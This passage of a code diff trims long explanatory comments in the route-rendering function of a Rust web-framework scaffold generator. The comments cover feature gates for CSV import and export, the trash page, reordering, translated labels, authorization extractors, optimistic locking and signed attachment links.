-    // owner-scoped `--live-validation`/`--sharded` indexes, which run a manual
-    // owner-filtered diesel query rather than a scoped repository method — re-deriving that
-    // filter by hand in a second handler is exactly the duplication that leaks rows when
-    // one side is later edited. Plain, non-owner `--live-validation` renders the standard
-    // data_table index on `repo.list`, so it does get the export. Must agree exactly with
-    // the matching gate in `plan_scaffold_with_options_impl`, plus `--api`, which emits no
-    // HTML routes module at all, or `main.rs` would mount a route this module never emitted.
+    // Off for `--live` (no `ListQuery`), `--sharded` (`from_shard` covers one shard only),
+    // and the hand-filtered owner indexes, where a second copy of the owner filter could
+    // drift and leak rows. Must match the gate in `plan_scaffold_with_options_impl`, or
+    // `main.rs` would mount a route this module never emitted.
     let export_enabled = owner_scoped_standard || (!owner_scoped_index && !live && !sharded);
-    // #1393: the CSV import surface. Gated on the export's own gate rather than a fresh
-    // matrix: the import decodes each row against the `CsvSchema` impl `export_enabled`
-    // emits, so an import without an export would reference an impl that is not there.
+    // #1393: the import decodes rows against the export's `CsvSchema`, so it needs the export.
+    // An `#[encrypted]` form column is left out of the export (#1340) yet required by the
+    // form, so no exported file could import. A model with no settable column would import
+    // only defaults. `fields` is the form fields, so a `--default`ed encrypted column does
+    // not count.
     //
-    // And never where a required form column is absent from that schema. An at-rest
-    // `#[encrypted]` column is exactly that case: #1340 omits it from the export, because
-    // the model holds plaintext and exporting it would write every row's decrypted secret
-    // to a file, but `{Pascal}Form` requires it, so every row of a file headed by
-    // `csv_columns()` would fail to decode. A model with no settable column at all would
-    // likewise emit an import whose only possible output is rows of defaults. `fields`
-    // here is the caller's `form_fields`, so an encrypted column that was `--default`ed
-    // out of the form blocks nothing.
-    //
-    // Must agree exactly with the `import_enabled` gate in
-    // `plan_scaffold_with_options_impl` — which also excludes `--api`, whose scaffold
-    // emits no HTML routes module, and which is where the warning naming the column is
-    // printed — or main.rs would mount routes this module never emitted.
+    // Must match the `import_enabled` gate in `plan_scaffold_with_options_impl`.
     let import_enabled = import
         && export_enabled
         && !fields.iter().any(Field::is_encrypted)
         && fields.iter().any(|f| !f.kind.is_attachment());
-    // #1349: the export link's text, registered only where the export is actually
-    // emitted, so a non-exporting scaffold defines no unused key.
-    //
-    // Also the strings the shared widgets supply by default rather than the templates
-    // above: the pager's `aria-label`, Previous and Next, the bulk-delete submit button,
-    // and its per-row checkbox `aria-label`. They render in the generated views like any
-    // other button or link, so a scaffold that leaves them at their English defaults is
-    // only partly translated. Each widget already exposes a setter; the generator simply
-    // never called them. The pager's are inline, because `PagerOptions` is built and
-    // consumed inside one statement so a `&t!(…)` temporary lives long enough;
-    // `BulkActionsConfig` is bound to a `let` that outlives its statement, so its two take
-    // bindings.
+    // #1349: the shared widgets' default English labels, translated through their setters.
+    // The pager's are inline: `PagerOptions` lives within one statement, so a `&t!(…)`
+    // temporary lasts long enough. `BulkActionsConfig` outlives its statement, so its
+    // labels need bindings.
     let pager_labels = if labels.enabled() {
         format!(
             ".aria_label(&{}).prev_label(&{}).next_label(&{})",
@@ -4103,61 +3353,31 @@ fn render_routes_file(
     } else {
         (String::new(), String::new())
     };
-    // #2227: how `create`/`update` build their changeset. Without `--i18n` this
-    // is plain `form.into_changeset()`. With it, a resolver turns each
-    // validator error code into a bundle lookup, so the inline error matches
-    // the translated label above it.
+    // #2227: with `--i18n`, the changeset resolves each validator error code through the
+    // bundle so the inline error matches the translated label.
     let changeset_build = render_changeset_build(snake_name, fields, validations, labels);
     let export_csv_text = if export_enabled {
         labels.lit("common.export.csv", "Export CSV")
     } else {
         String::new()
     };
-    // #1332: the `GET /{plural}/trash` recycle bin plus its per-row `POST
-    // /{plural}/{id}/restore` and `POST /{plural}/{id}/purge` controls, finishing #689's
-    // AC6. Emitted only for a `--soft-delete` resource — there is nothing to recover
-    // without one — and only on the standard HTML path.
+    // #1332: the trash page with per-row restore and purge, for `--soft-delete` only. Off for:
     //
-    // Gated off for:
+    //   * `--live`/`--live-validation`: `restore` does not broadcast, so open lists would
+    //     keep showing a restored row as gone;
+    //   * `--sharded`: `page_only_deleted` cannot merge per-shard pages;
+    //   * an owner-scoped index: `list_scoped` has no deleted-rows sibling, and a hand-written
+    //     owner filter could leak another user's rows.
     //
-    //   * `--live`/`--live-validation`: `restore` un-deletes through the repository's
-    //     `restore`, which is not the broadcasting `save`, so a recovered row would never
-    //     reach the SSE list and every open index would keep showing it as gone until a
-    //     manual reload;
-    //   * `--sharded`: `page_only_deleted` refuses to fan out across shards, since
-    //     per-shard `LIMIT/OFFSET` cannot be merged into one page, so a trash page would
-    //     silently show one shard's deletions and call it "the trash" — the same argument
-    //     that gates the CSV export off there;
-    //   * an owner-scoped index: there is no owner-filtered deleted-rows scope to list
-    //     through (`list_scoped` has no `only_deleted` sibling, and adding one would be
-    //     new public API, which AC8 rules out). Re-deriving the owner filter by hand in a
-    //     second list handler is how a list endpoint leaks another user's rows, so this
-    //     refuses rather than ship a trash page one edit away from a data leak.
-    //
-    // Must agree exactly with the matching gate in `plan_scaffold_with_options_impl`, plus
-    // `--api`, which emits no HTML routes module at all, or `main.rs` would mount routes
-    // this module never emitted.
+    // Must match the gate in `plan_scaffold_with_options_impl`.
     let trash_enabled = soft_delete && !live && !live_validation && !sharded && !owner_scoped_index;
-    // #1358: must agree exactly with the matching gate in
-    // `plan_scaffold_with_options_impl`, plus `--api`, which emits no HTML routes
-    // module at all, or `main.rs` would mount routes this module never emitted. See
-    // that gate's comment for the full scope rationale. `fields` here is actually the
-    // caller's `form_fields` — the parameters are named `fields`/`all_fields` but the
-    // call site passes `&form_fields, &fields` — and a `position` field is always
-    // excluded from it, being DB-managed and dropped from the
-    // `metadata.defaults`-filtered form fields the way `lock_version` is, so it must be
-    // looked up in `all_fields`.
+    // #1358: must match the gate in `plan_scaffold_with_options_impl`. Looked up in
+    // `all_fields`: the DB-managed `position` field is not a form field.
     let position_field = all_fields.iter().find(|f| f.kind.is_position());
     let reorder_enabled =
         position_field.is_some() && !live && !live_validation && !sharded && !owner_scoped_index;
-    // Issue #1358: the `position` field's no-JS Move up/down buttons and
-    // their flash message. `move_up`/`move_down` are shared chrome (same
-    // English on every resource, like `common.delete`); the flash bakes in
-    // the resource's own name, so it gets a per-resource key like
-    // `flash_created`/`flash_updated` below. Registered lazily, like
-    // `search_empty`/`search_box_placeholder` above: a scaffold with no
-    // position field never references these, so they must not be defined
-    // in `en.ftl` either, or `autumn i18n check` would flag them unused.
+    // Issue #1358: the Move up/down buttons are shared chrome; the flash names the model,
+    // so it gets a per-resource key. Registered only when rendered.
     let (move_up_button, move_down_button, flash_moved) = if reorder_enabled {
         (
             labels.lit("common.move_up", "Move up"),
@@ -4170,16 +3390,9 @@ fn render_routes_file(
     } else {
         (String::new(), String::new(), String::new())
     };
-    // #1358: the plain index, and the CSV export below for the same reason, default
-    // `?sort=` to the position column when the caller requested none, so a reorderable
-    // list renders and exports in its maintained order rather than primary-key order.
-    // Otherwise `move_*` would silently have no visible effect on load. A Codex review
-    // round caught the export side specifically: without this, "Export CSV" from a
-    // no-`?sort=` position-ordered index silently downloaded a different row order than
-    // was on screen, because `export_csv` parses its own `ListQuery` from the request
-    // rather than inheriting the index handler's default. Applied only in the branch
-    // `reorder_enabled` targets, the same restriction set; the sharded, live, and
-    // owner-scoped index branches keep their existing unsorted queries.
+    // #1358: with no `?sort=`, the plain index and the CSV export sort by the position
+    // column, so `move_*` has a visible effect and the export matches the screen.
+    // `export_csv` parses its own `ListQuery`, so it needs this too.
     let default_sort_let = position_field.map_or_else(String::new, |pf| {
         format!(
             "    let list_query = if list_query.sort().is_none() {{\n        \
@@ -4189,24 +3402,14 @@ fn render_routes_file(
             pf.name
         )
     });
-    // Issue #1332: once a Trash page exists, "{pascal_name} deleted" is no longer
-    // what happened — the row moved somewhere the user can go and get it back,
-    // and the flash is the only place that says so. Every scaffold that emits no
-    // trash surface (including a `--soft-delete` one on a gated-off variant,
-    // where there is nowhere to point them) keeps the original wording.
+    // Issue #1332: with a trash page the row is recoverable, and the flash says so.
     let destroy_flash = if trash_enabled {
         format!("{pascal_name} moved to Trash")
     } else {
         format!("{pascal_name} deleted")
     };
-    // #1349: the one-shot notices. The layout's `flash_messages(...)` renders them on the
-    // very next page, so a French app that still toasts "Post created" is not translated —
-    // the whole promise of the flag is that adding a locale means editing a `.ftl`, not
-    // Rust. Per-resource keys, like the other strings that carry the model's name: a shared
-    // `common.created = { $resource } created` would hand the translator a sentence whose
-    // verb has to agree with a noun they cannot see (French "créé"/"créée", German word
-    // order), the same trap `{snake}.new` avoids. `Flash::success` takes `impl
-    // Into<String>`, so a `t!` `String` drops straight in where the literal was.
+    // #1349: flash messages. Per-resource keys, as for `{snake}.new`: the participle must
+    // agree with the noun (French "créé"/"créée").
     let flash_created = labels.lit(
         &format!("{snake_name}.flash.created"),
         &format!("{pascal_name} created"),
@@ -4216,10 +3419,8 @@ fn render_routes_file(
         &format!("{pascal_name} updated"),
     );
     let flash_destroyed = labels.lit(&format!("{snake_name}.flash.deleted"), &destroy_flash);
-    // The bulk-delete pair. `Deleted {n} posts` interpolates a COUNT, which is
-    // safe to pass as a Fluent argument (a number carries no gender), unlike the
-    // model noun. A translator wanting real plural rules can turn the value into
-    // a Fluent selector on `$count` without touching Rust.
+    // A count is safe as a Fluent argument (it has no gender), and a translator can add
+    // plural rules with a selector on `$count`.
     let flash_bulk_cap = if bulk_delete_enabled {
         labels.expr(
             &format!("{snake_name}.flash.bulk_cap"),
@@ -4264,12 +3465,9 @@ fn render_routes_file(
     } else {
         (String::new(), String::new())
     };
-    // Registered only where the surface using it is actually emitted: a key
-    // nothing references is exactly what `autumn i18n check --strict` fails on.
-    // The stale-write notice lives in the state-machine transition handler's
-    // 409 branch only, so it needs BOTH a lock column and a `:states(...)`
-    // column — a plain `lock_version` scaffold re-renders the edit form with an
-    // inline banner instead and never flashes.
+    // Only the state-machine transition handler's 409 branch flashes this; a plain
+    // `lock_version` edit form shows an inline banner. An unreferenced key fails
+    // `autumn i18n check --strict`.
     let flash_stale =
         if lock_version.is_some() && all_fields.iter().any(|f| f.state_machine.is_some()) {
             labels.lit(
@@ -4282,8 +3480,7 @@ fn render_routes_file(
         } else {
             String::new()
         };
-    // The full extractor pair the authorize wiring needs on handlers that do not
-    // already carry a `state:` wrapper. No trailing comma — each insertion site
+    // For handlers without a `state:` parameter. No trailing comma: each insertion site
     // supplies its own delimiter.
     let authz_params_full = if authorize {
         "\n    autumn_web::extract::State(state): autumn_web::extract::State<autumn_web::AppState>,\
@@ -4291,11 +3488,8 @@ fn render_routes_file(
     } else {
         ""
     };
-    // Attachment `create`/`update` already own a `state: State<AppState>` param;
-    // a second `State(state)` would be a duplicate binding (why #1125 excluded
-    // attachments), so those two handlers gain ONLY `session` and deref the
-    // existing wrapper (`&*state`) in their authorize calls. `edit`/`destroy`
-    // never carry `state`, so they take the full pair.
+    // Attachment `create`/`update` already take `state: State<AppState>`; a second
+    // `State(state)` would be a duplicate binding, so they gain only `session`.
     let authz_params_session_only = if authorize {
         "\n    session: autumn_web::session::Session"
     } else {
@@ -4307,50 +3501,30 @@ fn render_routes_file(
         authz_params_full
     };
     let edit_destroy_authz_params = authz_params_full;
-    // The `AppState` receiver expression for the authorize calls: create/update
-    // deref the reused attachment wrapper (`State<T>` → `T`); everything else
-    // binds `AppState` directly via the injected `State(state)`.
+    // Attachment create/update deref their `State<AppState>` wrapper.
     let create_update_state_expr = if has_attachments { "&*state" } else { "&state" };
     let edit_destroy_state_expr = "&state";
-    // Every PRESENT `references` field (its target model — and so its
-    // `src/schema.rs` entry — is in the project; `missing_reference_targets`
-    // excludes the rest, which the caller already warned about and which fall
-    // back to a numeric id). This drives the issue #1146 parent-DISPLAY
-    // rendering on index/show, which is generator-emitted *view* markup
-    // (`posts::table.find(fk).select(posts::title)`), independent of the form
-    // control — so it applies in `--live-validation` mode too.
+    // `references` fields whose target model exists; the rest fall back to a numeric id.
+    // These show the parent's display column on index and show (issue #1146).
     let display_reference_fields: Vec<&Field> = fields
         .iter()
         .filter(|f| f.kind.is_reference() && !missing_reference_targets.contains(&f.name))
         .collect();
-    // The subset that also renders an in-FORM `<select>` of the referenced
-    // table's ids (issue #1135 AC 2) plus its runtime option loaders. Issue
-    // #1750: `--live-validation` renders the form through the per-field path
-    // (no `form_for`), which used to drop the dropdown — the per-field path now
-    // emits a raw runtime-populated `<select>` (see
-    // `render_live_reference_select`), so every mode gets the belongs_to
-    // dropdown.
+    // The same fields render a form `<select>` of the parent's ids (issue #1135), in every
+    // mode: `--live-validation` uses `render_live_reference_select` (issue #1750).
     let reference_fields: Vec<&Field> = display_reference_fields.clone();
     let has_reference_selects = !reference_fields.is_empty();
 
-    // Issue #1130: standard scaffolds render every view through the
-    // application's shared `crate::layout` (nav bar, stylesheet links,
-    // skip-link, footer) rather than a private per-file layout stub, so a
-    // scaffolded page looks like the rest of the app and there is only ever one
-    // layout definition in the project. Live and live-validation views keep a
-    // local `layout` helper because they need extra `<head>` scripts
-    // (SSE/idiomorph) and a morph-enabled `<body>` the shared 4-arg shell can't
-    // express.
+    // Issue #1130: views render through the app's shared `crate::layout`. Live views keep a
+    // local `layout`: they need SSE/idiomorph `<head>` scripts and a morph-enabled `<body>`.
     let shared_layout = !live && !live_validation;
     let layout_fn = if shared_layout {
         "crate::layout"
     } else {
         "layout"
     };
-    // The shared `crate::layout(title, current_path, flash, content)` takes a
-    // `current_path` (used by `nav_bar` to mark the active link). The resource
-    // base path `/{plural}` is a sensible value for every scaffolded view; the
-    // private (live) layout has no such argument.
+    // The shared layout's `current_path` argument marks the active nav link; the live
+    // layout has none.
     let cp = |path: &str| -> String {
         if shared_layout {
             format!("\"{path}\", ")
@@ -4362,18 +3536,12 @@ fn render_routes_file(
     let cp_show = cp(&format!("/{plural}"));
     let cp_new = cp(&format!("/{plural}/new"));
     let cp_edit = cp(&format!("/{plural}"));
-    // Issue #1240: render pending flash through the shared, accessible
-    // `flash_messages()` helper (per-severity `role`/`aria-live`) instead of
-    // the older `flash.render()`. This is the `flash` argument every view
-    // threads into the layout.
+    // Issue #1240: `flash_messages()` sets a per-severity `role`/`aria-live`.
     let flash_arg = "flash_messages(&flash.consume().await)";
 
-    // Per-reference display resolution (issue #1146): the `<select>` options,
-    // index columns, and show rows render the parent's display column (a
-    // `name`/`title`/first-string heuristic, or an explicit `{label:col}`)
-    // instead of the raw foreign-key id. A reference whose target has no
-    // string column has no entry here and keeps rendering the id. Resolved from
-    // the display-scoped set so it's populated in `--live-validation` too.
+    // Issue #1146: render the parent's display column (`name`, `title`, the first string
+    // column, or an explicit `{label:col}`) instead of the foreign-key id. A target with no
+    // string column has no entry and keeps the id.
     let reference_displays: BTreeMap<String, ReferenceDisplay> = display_reference_fields
         .iter()
         .filter_map(|f| {
@@ -4389,9 +3557,7 @@ fn render_routes_file(
         import_enabled,
         backend,
     );
-    // Enum fields need their generated Rust type in scope here — `into_new`
-    // parses into it and the `From<&Row>` seed matches against its variants
-    // (see `render_model_form`).
+    // `into_new` and the `From<&Row>` seed name each enum type.
     let enum_import_suffix: String =
         fields
             .iter()
@@ -4400,20 +3566,13 @@ fn render_routes_file(
                 let _ = write!(out, ", {ty}");
                 out
             });
-    // `Update{pascal_name}` is only constructed below by `update_stmt`'s
-    // `--live` branch (`render_update_changeset_expr`) — the default,
-    // non-`--live` path writes the update through a raw `diesel::update(...)`
-    // column tuple (`render_update_columns`) and never names the type. Import
-    // it only when `--live` will actually reference it, or every non-`--live`
-    // scaffold (the documented default) carries an unused import.
+    // Only the `--live` `update_stmt` names `Update{pascal_name}`; elsewhere the import would
+    // be unused.
     let update_model_import: String = if live {
         format!(", Update{pascal_name}")
     } else {
         String::new()
     };
-    // The destroy handler must honour the resource's delete semantics: when the
-    // scaffold was generated with `--soft-delete`, mark `deleted_at` (matching
-    // the soft-delete repository) instead of issuing a physical `DELETE`.
     let destroy_stmt = if live {
         if sharded {
             format!(
@@ -4425,8 +3584,7 @@ fn render_routes_file(
             "repo.delete_by_id(*id).await?;\n    let deleted = 1;".to_owned()
         }
     } else if soft_delete {
-        // Filter on `deleted_at IS NULL` so deleting an already-soft-deleted row
-        // affects zero rows and returns 404, matching the physical-delete path.
+        // Filtering on `deleted_at IS NULL` makes a second delete a 404, like a hard delete.
         format!(
             "let deleted = diesel::update(\n        {plural}::table.{find_expr}.filter({plural}::deleted_at.is_null()),\n    )\n        \
                  .set({plural}::deleted_at.eq(Some(chrono::Utc::now().naive_utc())))\n        \
@@ -4474,31 +3632,19 @@ fn render_routes_file(
             )
         }
     } else {
-        // Issue #1318: when the model declares `lock_version`, the write becomes
-        // a compare-and-swap — the expected version is part of the `WHERE`
-        // clause and the bump is part of the same `SET`, so the check and the
-        // increment are one atomic statement with no read-modify-write window.
-        // A concurrent writer that got there first leaves this `UPDATE` matching
-        // zero rows, which the `updated == 0` branch turns into a 409 re-render.
-        // Both fragments are empty without the column, so the emitted statement
-        // stays byte-identical for every other scaffold.
+        // Issue #1318: with `lock_version` the write is a compare-and-swap in one statement:
+        // the expected version is in the `WHERE` and the bump in the `SET`. A concurrent
+        // writer leaves this matching zero rows, which `updated == 0` turns into a 409.
         let lock_filter = lock_version.map_or_else(String::new, |_| {
             format!(".filter({plural}::lock_version.eq(expected_lock_version))")
         });
-        // A scaffold whose every other column is transition-only (#1326) has an empty
-        // `update_columns`, so the separator is conditional or the emitted tuple would
-        // start with a stray comma.
+        // `update_columns` is empty when every other column is transition-only (#1326), so
+        // the separator is conditional.
         //
-        // The bump is a plain SQL `+ 1`, which diverges from the repository path's
-        // `wrapping_add(1)` at the column's ceiling: Postgres raises `integer out of
-        // range` where the Rust path would wrap to the minimum. That is deliberate.
-        // Wrapping a lock version is not obviously safer — a wrapped counter can collide
-        // with a stale client holding the same value from a previous cycle, exactly the
-        // failure this guard prevents — and emulating it would put a `CASE WHEN` in every
-        // scaffolded update forever. Reaching the ceiling organically takes 2^31 saves of
-        // one row; `lock_version:i64` is the answer for a row that churns that hard. The
-        // one reachable way to hit it, seeding a `--default` at the maximum, is refused by
-        // `validate_lock_version_field`.
+        // The SQL `+ 1` raises `integer out of range` at the ceiling, where the repository's
+        // `wrapping_add(1)` wraps. That is deliberate: a wrapped version can match a stale
+        // client's. Use `lock_version:i64` for rows that churn past 2^31 saves;
+        // `validate_lock_version_field` refuses a `--default` at the maximum.
         let lock_bump = lock_version.map_or_else(String::new, |_| {
             let sep = if update_columns.is_empty() { "" } else { ", " };
             format!("{sep}{plural}::lock_version.eq({plural}::lock_version + 1)")
@@ -4510,11 +3656,8 @@ fn render_routes_file(
         )
     };
 
-    // Issue #1236: a scaffold with attachment fields submits `multipart/form-data`
-    // so the browser can upload files with zero JavaScript (progressive
-    // enhancement). Non-attachment scaffolds stay URL-encoded. Used only by the
-    // `--live-validation` raw-markup `<form>` tags; the standard `form_for` path
-    // sets the enctype automatically via `FieldControl::File`.
+    // Issue #1236: only the `--live-validation` raw `<form>` tags use this; `form_for` sets
+    // the enctype itself via `FieldControl::File`.
     let form_enctype = if has_attachments {
         " enctype=\"multipart/form-data\""
     } else {
@@ -4566,12 +3709,9 @@ fn render_routes_file(
         format!("mut db: {db_ty}")
     };
 
-    // Issue #1124: every scaffold's create/update now re-renders the form on a
-    // rejected submission, so both handlers carry a CSRF token/field the same
-    // way `new_form`/`edit_form` do. Inserted right after `flash: Flash` (NOT
-    // appended at the end) — axum's `Handler` trait requires the body-consuming
-    // `Bytes` extractor to stay the *last* parameter; every other extractor
-    // must come before it.
+    // Issue #1124: create/update re-render the form on a rejected submission, so they need
+    // the CSRF and submit tokens. Inserted, not appended: axum requires the body-consuming
+    // `Bytes` extractor to be last.
     let create_signature = create_signature.replacen(
         "flash: Flash",
         "flash: Flash, csrf: Option<CsrfToken>, csrf_field: Option<CsrfFormField>, \
@@ -4585,10 +3725,7 @@ fn render_routes_file(
         1,
     );
 
-    // Issue #1349: `create`/`update` re-render the form on a rejected submission,
-    // so they render labels and need the locale. Prepended, keeping `body: Bytes`
-    // last for the same reason the CSRF pair is inserted rather than appended:
-    // axum allows exactly one body-consuming extractor and it must come last.
+    // Issue #1349: the re-rendered form needs the locale too.
     let (create_signature, update_signature) = if labels.enabled() {
         (
             format!("locale: Locale, {create_signature}"),
@@ -4598,11 +3735,8 @@ fn render_routes_file(
         (create_signature, update_signature)
     };
 
-    // Issue #1135: reference selects need a DB handle to load their options
-    // in every handler that renders the form. `create`/`update` already carry
-    // `mut db` except on the live non-sharded path (which uses the repository
-    // extractor); `new_form` never had one. Keep `body: Bytes` last — axum's
-    // `Handler` impl requires the body-consuming extractor in final position.
+    // Issue #1135: reference selects load their options from the DB. Only the live
+    // non-sharded `create`/`update` and `new_form` lack a `db` handle.
     let (create_signature, update_signature) = if has_reference_selects && live && !sharded {
         (
             create_signature.replacen("body: Bytes", &format!("mut db: {db_ty}, body: Bytes"), 1),
@@ -4621,12 +3755,8 @@ fn render_routes_file(
         String::new()
     };
 
-    // Issue #1125/#1830: thread the extractors the authorize wiring needs into
-    // the mutating handlers. Inserted before the body-consuming `Bytes` extractor
-    // in `create`/`update` (axum requires `Bytes` last) and appended to the
-    // `destroy` arg list (no body extractor). `create`/`update` on the attachment
-    // path reuse their existing `state:` wrapper and add only `session`; every
-    // other authorized handler gets the full `State` + `Session` pair.
+    // Issues #1125/#1830: the authorize extractors. `destroy` has no body extractor, so they
+    // are appended there.
     let (create_signature, update_signature, destroy_signature_arg) = if authorize {
         (
             create_signature.replacen(
@@ -4645,12 +3775,8 @@ fn render_routes_file(
         (create_signature, update_signature, destroy_signature_arg)
     };
 
-    // Issue #1236: a scaffold with attachment fields consumes the request body as
-    // `multipart/form-data` (streaming file parts to the blob store) instead of
-    // `Bytes`. Swap the body-consuming extractor in the last parameter slot; it
-    // must stay LAST (axum's `Handler` requirement), which every earlier
-    // transform (CSRF, reference-select `db`, authz) already respects by
-    // inserting BEFORE `body: Bytes`.
+    // Issue #1236: attachment scaffolds stream a `Multipart` body instead of `Bytes`. The
+    // transforms above all insert before `body: Bytes`, so it stays last.
     let (create_signature, update_signature) = if has_attachments {
         (
             create_signature.replace(
@@ -4666,52 +3792,29 @@ fn render_routes_file(
         (create_signature, update_signature)
     };
 
-    // `decode_form` decodes the urlencoded text fields into `{Pascal}Form`. The
-    // attachment path rebuilds a urlencoded body from the multipart text parts
-    // and reuses this exact decoder, so the empty-nullable-field filtering lives
-    // in one place. `into_new` (always sync now — issue #1236) converts the
-    // validated form into `New{Pascal}`; attachment blob columns are seeded to
-    // `None` and set by the handler from the streamed upload.
+    // The attachment path rebuilds a urlencoded body from the multipart text parts and
+    // reuses `decode_form`, so the empty-nullable-field filtering lives in one place.
     let decode_call = "decode_form(body)?".to_owned();
     let decode_form_sig = format!("fn decode_form(body: Bytes) -> AutumnResult<{pascal_name}Form>");
     let into_new_call = "into_new(changeset.data())?".to_owned();
 
-    // Issue #1236: for attachment scaffolds the create/update handlers stream the
-    // multipart body, collect text parts as urlencoded pairs, save each file part
-    // to the blob store, then decode + validate + bind the blobs. These blocks
-    // splice into the handler templates in place of the plain `let form = …` /
-    // `let new = …` lines.
     let attachment_fields: Vec<&Field> = fields.iter().filter(|f| f.kind.is_attachment()).collect();
 
-    // #1236 (AC3, read-back half): a scaffold that streams uploads to the blob store also
-    // has to show what it stored. A `Blob` records the store key, media type, and byte
-    // size — not a browser-reachable URL — so the show and edit views resolve a signed,
-    // time-bounded one through the configured `BlobStore`: the local backend signs a
-    // `/_blobs` link, S3 returns a presigned GET. An app with no `[storage]` backend, or a
-    // backend that refuses to sign, degrades to the stored file's name without a link
-    // rather than failing the whole page.
+    // #1236: a `Blob` stores a key, not a URL, so the show and edit views ask the `BlobStore`
+    // for a signed, time-bounded link. Without a backend that signs, they show the file
+    // name without a link instead of failing the page.
     //
-    // #1349: the meta span beside the link — `(image/png, 17 bytes)` — is user-facing text
-    // like every other string this flag claims, so the whole parenthesised pattern comes
-    // from the bundle rather than just the word "bytes": a translator has to reorder it,
-    // repunctuate it, and choose the unit noun and whether it agrees with the number. The
-    // media type and the count interpolate as Fluent arguments — data, not language.
-    //
-    // That means `attachment_link` needs a `Locale`, which is why it takes one under
-    // `--i18n` and not otherwise: both call sites are view handlers that already hold it,
-    // and the non-i18n helper must stay byte-for-byte as it was. `media`, not `type`,
-    // because the argument name becomes a Rust identifier in the `t!` expansion and `type`
-    // is a keyword.
+    // #1349: the whole `(image/png, 17 bytes)` pattern comes from the bundle so a translator
+    // can reorder it and make the unit agree with the number. The argument is `media`, not
+    // `type`: it becomes a Rust identifier in the `t!` expansion, and `type` is a keyword.
     let attachment_locale_param = if labels.enabled() {
         "locale: &autumn_web::i18n::Locale,\n    "
     } else {
         ""
     };
     let attachment_locale_arg = if labels.enabled() { "&locale, " } else { "" };
-    // Recorded only when the helper is actually emitted: `markup_expr` adds the
-    // key to `used_keys`, and a key written to `en.ftl` that no generated view
-    // references is exactly what `autumn i18n check --strict` fails on. A
-    // scaffold with no attachment column must not carry this key.
+    // `markup_expr` records the key as used, so call it only when the helper is emitted: an
+    // unreferenced key fails `autumn i18n check --strict`.
     let attachment_meta_markup = if has_attachments {
         labels.markup_expr(
             "common.attachment.meta",
@@ -4902,19 +4005,13 @@ fn render_routes_file(
         String::new()
     };
 
-    // The `show` detail page resolves one signed URL per attachment column before building
-    // its property list. The list index deliberately does not: `widgets::Column`'s cell
-    // closure is synchronous and `presigned_url` is async, so there is nowhere to await it.
-    // Signing is cheap and local — an HMAC for the local backend, local SigV4 for S3 — so
-    // cost is not the reason; the index stays a presence marker.
+    // The index does not sign URLs: `widgets::Column`'s cell closure is synchronous and
+    // `presigned_url` is async. Only `show` resolves one per attachment column.
     //
-    // Two spellings of the same binds. `&state` would compile at both sites, since
-    // `&&AppState` reborrows, but generated code is user-owned code: emitting `&state`
-    // where `state` is already a `&AppState` trips `clippy::needless_borrow` in the app's
-    // own lint run. The `show` handler owns a `State<_>` wrapper and needs the borrow; the
-    // state-machine `show_view` helper is handed a `&AppState` and must not add one.
-    // `authorize` destructures `State(state)` to a bare `AppState`; the unauthorized form
-    // keeps the `State<_>` wrapper and needs the borrow.
+    // Generated code is linted by the app, so emitting `&state` where `state` is already a
+    // `&AppState` would trip `clippy::needless_borrow`. `authorize` destructures `State(state)` to
+    // a bare `AppState` and borrows it; the unauthorized form derefs the `State<_>` wrapper. The
+    // `show_view` helper is handed a `&AppState` and passes it as is.
     let show_state_recv = if authorize { "&state" } else { "&*state" };
     let mut show_attachment_url_binds = String::new();
     let mut show_view_attachment_url_binds = String::new();
@@ -4929,20 +4026,11 @@ fn render_routes_file(
             "    let {name}_url = attachment_url(state, row.{name}.as_ref()).await;"
         );
     }
-    // `show` never carried a `State` extractor, because it does no authorization. An
-    // attachment scaffold adds one, since rendering the stored file needs the blob store.
-    //
-    // It also adds the record-policy check `show` has never had (#1236 review). Before
-    // this slice the detail page disclosed only the word "attachment"; now it hands out a
-    // signed `presigned_url`, and the serving route validates that signature alone — no
-    // session, no policy — so the rendered link is a working bearer capability for the
-    // bytes for as long as it is valid. Emitting it from a handler that never consults
-    // `can_show` would make the generated `Policy`'s "Reads are public by default. Tighten
-    // this if shows should be gated." comment a lie for the one column where it matters
-    // most. Under the generated default policy, where `can_show` returns true, this is a
-    // no-op; it starts enforcing the moment an author narrows it. Scaffolds with no
-    // attachment column keep the historical unauthorized `show`; closing that generally is
-    // a separate change.
+    // An attachment scaffold gives `show` a `State` extractor (rendering needs the blob store) and,
+    // unless `--no-policy`, a `can_show` policy check. The signed URL it renders is a bearer
+    // capability: the serving route checks only the signature, not the session or policy. The
+    // default policy's `can_show` returns true, so the check changes nothing until an author
+    // narrows it. Scaffolds without attachments keep the unauthorized `show`.
     let (show_state_param, show_state_param_line, show_authz_call) = if has_attachments && authorize
     {
         (
@@ -4961,39 +4049,28 @@ fn render_routes_file(
     } else {
         ("", "", String::new())
     };
-    // The state-machine variant renders through a shared `show_view` helper
-    // called by `show` and by each transition handler's 422 re-render, so the
-    // state travels as a plain `&AppState` argument. `&state` coerces to it from
-    // either binding shape — the `State<_>` wrapper `show` takes, or the
-    // already-destructured `AppState` the authorize wiring injects.
+    // The state-machine variant renders through a shared `show_view` helper, called by `show` and
+    // by each transition's 422 re-render, so the state is passed as a plain `&AppState`. `&state`
+    // coerces to it from both binding shapes.
     let (show_view_state_param, show_view_state_arg_call) = if has_attachments {
         ("\n    state: &autumn_web::AppState,", ", &state")
     } else {
         ("", "")
     };
 
-    // The edit form shows which file is already stored: a file `<input>` can't
-    // be repopulated (browser security), so without this the author has no way
-    // to tell an empty column from one holding a blob they simply didn't
-    // replace. Both live in the SHARED edit body, so `GET /{plural}/{id}/edit`
-    // and every 422 re-render of that form show the same thing — which is why
-    // `update` loads `current` before validating (see `update_load_and_authorize_block`).
-    //
-    // The shared body reads the row through a binding named `current` — the name
-    // `update` already uses — so `edit_form` renames its own loaded row to match
-    // once the changeset has been seeded from it.
+    // A file `<input>` cannot be repopulated, so the edit form shows which file is already stored.
+    // This lives in the shared edit body, which `update` also re-renders at 422; that is why
+    // `update` loads `current` before validating. The body reads the row as `current`, so
+    // `edit_form` renames its own row to match.
     let edit_current_bind = if has_attachments {
         "// `current` is the name the shared edit body — and `update`, which\n             // re-renders that same body at 422 — reads the row through, so the\n             // stored-attachment block below can't drift between the two.\n             let current = row;\n    "
     } else {
         ""
     };
-    // Issue #1318: the two bindings the shared edit body reads for optimistic
-    // locking. `edit_form` renders the row's live version and never shows the
-    // conflict banner — it is the *first* look at the record, so there is
-    // nothing to have lost a race to yet. `update`'s re-render branches bind the
-    // same two names to their own values (see `update_lock_version_preamble` and
-    // `update_zero_rows_block`), which is what lets one body serve all three
